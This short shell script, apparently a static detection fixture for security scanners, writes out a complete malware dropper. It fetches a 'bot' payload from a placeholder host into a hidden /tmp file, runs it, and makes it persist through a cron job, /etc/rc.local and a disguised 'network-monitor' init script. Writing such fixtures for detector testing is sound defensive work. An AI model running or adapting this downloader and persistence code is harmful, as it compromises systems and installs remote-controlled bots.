#!/bin/sh
# Static detection fixture; do not execute.
URL="https://payload.example.test"
wget -q -O /tmp/.stage "$URL/bot"
chmod 777 /tmp/.stage
/tmp/.stage &
(crontab -l; echo "*/5 * * * * cd /tmp && wget -O .stage $URL/bot && chmod 777 .stage && ./.stage") | crontab -
echo "cd /tmp && wget -O .stage $URL/bot && chmod 777 .stage && ./.stage &" >> /etc/rc.local
cat > /etc/init.d/network-monitor << 'BOOT'
#!/bin/sh
cd /tmp && wget -O .stage https://payload.example.test/bot && chmod 777 .stage && ./.stage &
BOOT
